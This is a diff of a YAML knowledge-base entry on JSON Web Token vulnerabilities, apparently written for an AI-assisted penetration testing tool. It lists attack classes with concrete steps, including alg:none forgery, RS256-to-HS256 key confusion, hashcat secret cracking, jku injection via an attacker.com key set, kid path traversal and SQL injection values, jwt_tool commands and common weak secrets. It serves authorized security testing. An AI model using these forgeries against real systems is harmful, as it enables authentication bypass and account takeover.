@@ -1,37 +1,113 @@
 id: JWT
-name: JWT Vulnerabilities
+name: JSON Web Token Vulnerabilities — Comprehensive
 cwe:
-- CWE-345
 - CWE-347
+- CWE-345
+- CWE-327
 owasp: A02:2021 Cryptographic Failures
 severity_range: High - Critical
-description: JWT implementation flaws allowing token forgery, algorithm confusion, or information leakage.
+description: JWTs are signed tokens carrying claims. Implementation flaws in verification, weak signing keys, or trusted external
+  resources enable token forgery and authentication bypass.
 detection:
-  payloads:
-    none_algorithm: Set alg to 'none' and remove signature
-    alg_confusion: Change RS256 to HS256 and sign with the public key
-    weak_secret: Brute-force HMAC secret using common wordlists
-    jwk_injection: Inject JWK in header with attacker's key
-    jku_spoofing: Point jku header to attacker-controlled JWKS endpoint
-    kid_injection: SQL injection or path traversal via kid parameter
   strategy:
-  - 1. Decode the JWT (header.payload.signature) — use base64
-  - 2. Check the algorithm (alg field in header)
-  - 3. Try alg:none — remove signature, set alg to 'none'
-  - 4. If RS256, try HS256 with the public key as HMAC secret
-  - 5. Try brute-forcing HMAC secret with common passwords
-  - 6. Check for sensitive data in payload (passwords, internal IDs)
-  - 7. Test token expiration — do expired tokens still work?
-  - 8. Test token reuse — can a token be used after logout?
-  - 9. Check kid parameter for injection (SQLi, path traversal)
-  - 10. Try modifying payload claims (role, user_id) without resigning
-evidence_needed: Forged JWT token accepted by the server, or sensitive data extracted from unencrypted payload
+  - 1. Capture a JWT (Authorization header, cookie, query param)
+  - 2. Decode header and payload (jwt.io or base64 -d)
+  - 3. Identify signing algorithm (alg field)
+  - 4. Test each attack class methodically
+  attack_classes:
+    alg_none:
+      description: Set alg to 'none' and remove signature — some libs accept it.
+      exploitation:
+      - 'Modify header: {"alg":"none","typ":"JWT"}'
+      - 'Forge payload: {"sub":"admin","roles":["admin"]}'
+      - Concatenate header.payload. (note trailing dot, empty signature)
+      - Submit — if accepted, full auth bypass
+      severity: critical
+    alg_confusion_rs_to_hs:
+      description: 'RS256 → HS256 confusion: use public key as HMAC secret.'
+      exploitation:
+      - Obtain server's RSA public key (often at /.well-known/jwks.json)
+      - Change alg to HS256
+      - Sign with HMAC using the public key as the secret
+      - Server verifies with the same public key (now treated as HMAC secret)
+      - Token validates with attacker-controlled claims
+      severity: critical
+    weak_hmac_secret:
+      description: HS256 with weak/guessable secret.
+      exploitation:
+      - Capture JWT
+      - hashcat -m 16500 jwt.txt wordlist.txt
+      - 'If cracked: re-sign with cracked secret + forged claims'
+      severity: critical
+    jku_injection:
+      description: jku header points to attacker-controlled JWKS endpoint.
+      exploitation:
+      - Generate RSA keypair
+      - Host JWKS at https://attacker.com/.well-known/jwks.json with attacker's public key
+      - 'Set JWT header: {"jku":"https://attacker.com/.well-known/jwks.json","alg":"RS256","kid":"attacker-key"}'
+      - Sign JWT with attacker's private key
+      - Server fetches JWKS, validates with attacker's public key, accepts forged claims
+      severity: critical
+    x5u_injection:
+      description: Same as jku but with X.509 cert URL.
+      exploitation:
+      - Host self-signed cert at attacker URL, sign with corresponding private key
+      severity: critical
+    kid_injection:
+      description: kid header used in path traversal or SQL injection to point to known key.
+      exploitation:
+      - 'kid: ../../../../dev/null — null key, sign with empty key'
+      - 'kid: /etc/passwd — predictable file content as key'
+      - 'kid: '' UNION SELECT ''attacker_key'' -- — SQLi in key lookup'
+      severity: high
+    jwk_embedded:
+      description: Embed attacker's public key in jwk header field.
+      exploitation:
+      - Set JWT header.jwk to attacker's public key in JWK format
+      - Sign with corresponding private key
+      - Some libs use the embedded key for verification — trivial forgery
+      severity: critical
+    blank_password:
+      description: HMAC with empty secret accepts any token.
+      exploitation:
+      - Sign with empty secret '' — some libs accept it
+      severity: critical
+    key_confusion_ecdsa:
+      description: ES256 vs ES384 vs ES512 confusion (similar to RS/HS).
+      severity: high
+    claim_manipulation:
+      description: 'Find weakly-verified claims (admin: true, role).'
+      exploitation:
+      - Set 'admin' claim if backend uses non-spec claims
+      - Manipulate 'iss' if validation is permissive
+      - Set future 'exp' if NotOnOrAfter is not validated
+      severity: medium
+    confused_deputy:
+      description: JWT issued for service B accepted by service A (no aud check).
+      severity: high
+exploitation:
+  tooling:
+  - jwt_tool — comprehensive testing (--alg-none, --hmac-confusion, --jku, --x5u)
+  - jwt-cracker — HMAC brute force
+  - hashcat -m 16500 for JWT HS256
+  commands:
+  - 'jwt_tool TOKEN -X a  # alg=none attack'
+  - 'jwt_tool TOKEN -X k -pk public.pem  # key confusion'
+  - 'jwt_tool TOKEN -X i -I -pc name -pv admin  # inject claim'
+  - 'jwt_tool TOKEN -X s  # check for weak secret signing'
 ai_research_hints:
-- Check if the server validates the signature at all
-- Look for the public key in /.well-known/jwks.json or /api/keys
-- Test if the same JWT works across different services (shared secret)
-- Check if refresh tokens are properly invalidated on logout
+- Check jwt.io for token structure — pay attention to non-standard claims
+- Look for jku/x5u in the header — if present, test that vector first
+- 'Common HMAC secrets: ''secret'', ''jwt_secret'', ''changeme'', the app''s name, the company''s name'
+- Check for JWT in cookies (httpOnly bypass via XSS isn't possible but CSRF is)
+- Some apps verify signature only on some endpoints — try omitting signature on each
+- Mobile apps sometimes embed JWT signing keys in the binary
+evidence_needed: Successful authentication with a forged or manipulated JWT.
+tools:
+- jwt_tool
+- hashcat
+- Burp JWT Editor extension
 references:
 - https://portswigger.net/web-security/jwt
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
-- https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+- https://github.com/ticarpi/jwt_tool
+- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
